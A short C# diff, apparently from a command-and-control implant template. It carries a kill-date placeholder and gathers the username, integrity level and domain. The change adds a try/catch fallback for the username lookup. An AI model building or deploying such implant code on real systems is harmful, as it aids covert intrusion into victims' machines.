@@ -174,7 +174,13 @@ public class Program
 	{
 		if (Convert.ToDateTime("#REPLACEKILLDATE#") > DateTime.Now)
 		{
-			var u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+			var u = "";
+			try
+			{
+				u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+			} catch {
+				u = System.Environment.UserName;
+			}
 			if (IsHighIntegrity())
 			  u += "*";
 			var dn = System.Environment.UserDomainName;
